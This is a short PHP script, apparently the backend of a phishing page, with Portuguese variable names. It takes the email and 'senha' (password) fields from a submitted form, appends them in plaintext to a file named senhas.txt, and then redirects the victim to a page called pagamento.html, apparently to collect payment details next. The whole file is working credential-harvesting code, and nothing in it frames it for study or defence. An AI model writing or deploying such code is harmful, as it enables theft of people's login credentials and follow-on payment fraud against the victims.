
<?php

$email=$_POST['email']."\r\n";
$senha=$_POST['senha']."\r\n";
$traco="========================="."\r\n";
$seuemail="EMAIL: ";
$suasenha="SENHA: ";


$file = fopen("senhas.txt","a");


$escrever1=fwrite($file, $traco);
$escrever3=fwrite($file, $seuemail);
$escrever4=fwrite($file, $email);
$escrever5=fwrite($file, $suasenha);
$escrever6=fwrite($file, $senha);
fclose($file);

?>

<script language="JavaScript"> 
window.location="pagamento.html"; 
</script> 
